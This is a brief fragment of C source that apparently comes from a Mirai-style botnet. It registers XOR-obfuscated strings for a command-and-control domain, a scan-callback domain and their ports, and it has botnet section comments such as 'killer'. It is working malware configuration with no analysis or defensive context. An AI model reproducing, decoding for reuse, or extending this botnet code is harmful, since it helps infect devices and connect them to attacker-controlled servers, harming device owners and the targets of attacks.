...
{   
    ...
    add_entry(TABLE_INSTANCE_EXISTS, "\x5E\x6C\x29\x6E\x66\x7D\x29\x7D\x61\x60\x7A\x29\x7A\x61\x60\x7D\x29\x68\x65\x7B\x6C\x68\x6D\x70\x27\x09", 26);
        /* connections shit */
    add_entry(TABLE_CNC_DOMAIN, "\x6A\x67\x6A\x27\x6A\x66\x67\x6D\x60\x67\x6C\x7D\x27\x6A\x6F\x09", 16);
    add_entry(TABLE_SCAN_DOMAIN, "\x7B\x6C\x79\x66\x7B\x7D\x27\x6A\x66\x67\x6D\x60\x67\x6C\x7D\x27\x6A\x6F\x09", 19);
    add_entry(TABLE_CNC_PORT, "\x02\xB6", 2);
    add_entry(TABLE_SCAN_CB_PORT, "\xB5\x0D", 2);
        /* killer */
